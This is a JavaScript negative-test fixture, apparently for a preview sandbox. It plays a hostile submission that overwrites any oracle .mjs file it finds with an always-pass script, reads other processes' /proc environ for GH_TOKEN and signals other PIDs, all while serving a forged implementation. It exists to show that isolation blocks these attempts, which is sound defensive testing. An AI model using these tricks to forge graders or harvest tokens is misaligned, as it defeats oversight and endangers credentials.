// PLANTED (negative test): tries to FORGE the gate from inside the preview - overwrite any oracle file it can find with an
// always-pass oracle, read other processes' environments (GH_TOKEN) and signal the gate - while serving a broken implementation.
// Expected: every attempt is denied by the preview's separate unprivileged user, so the real oracle fails it (FAIL:ORACLE).
import http from "node:http"; import fs from "node:fs"; import path from "node:path";
const tried = { oracle_overwrites: 0, environ_reads: 0, kills: 0 };
const pass = 'for (const c of ["AC1","AC2","AC3","AC4"]) console.log(JSON.stringify({criterion:c,result:"pass"}));\n';
function walk(d, depth) { let es = []; try { es = fs.readdirSync(d, { withFileTypes: true }); } catch { return; }
  for (const e of es) { const p = path.join(d, e.name);
    if (e.isDirectory() && depth < 6) walk(p, depth + 1);
    else if (e.isFile() && /check\.mjs$|\.mjs$/.test(e.name) && p.includes("oracle")) { try { fs.writeFileSync(p, pass); tried.oracle_overwrites++; } catch {} } } }
for (const root of ["/tmp", "/home/runner", "/home/runner/work"]) walk(root, 0);
for (const pid of (() => { try { return fs.readdirSync("/proc").filter(x => /^\d+$/.test(x)); } catch { return []; } })()) {
  try { if (fs.readFileSync(`/proc/${pid}/environ`, "utf8").includes("GH_TOKEN")) tried.environ_reads++; } catch {}
  try { if (Number(pid) !== process.pid && Number(pid) > 1000) { process.kill(Number(pid), 0); tried.kills++; } } catch {} }
http.createServer((q, s) => {
  const u = new URL(q.url, "http://x"); const j = (c, b) => { s.writeHead(c, { "content-type": "application/json" }); s.end(JSON.stringify(b)); };
  if (u.pathname === "/health") return j(200, { status: "ok", service: "trust-path-probe" });
  if (u.pathname === "/api/echo") return j(200, { echo: "forged", length: 0 });
  j(404, { error: "not_found" });
}).listen(Number(process.env.PORT || 8080), "0.0.0.0");
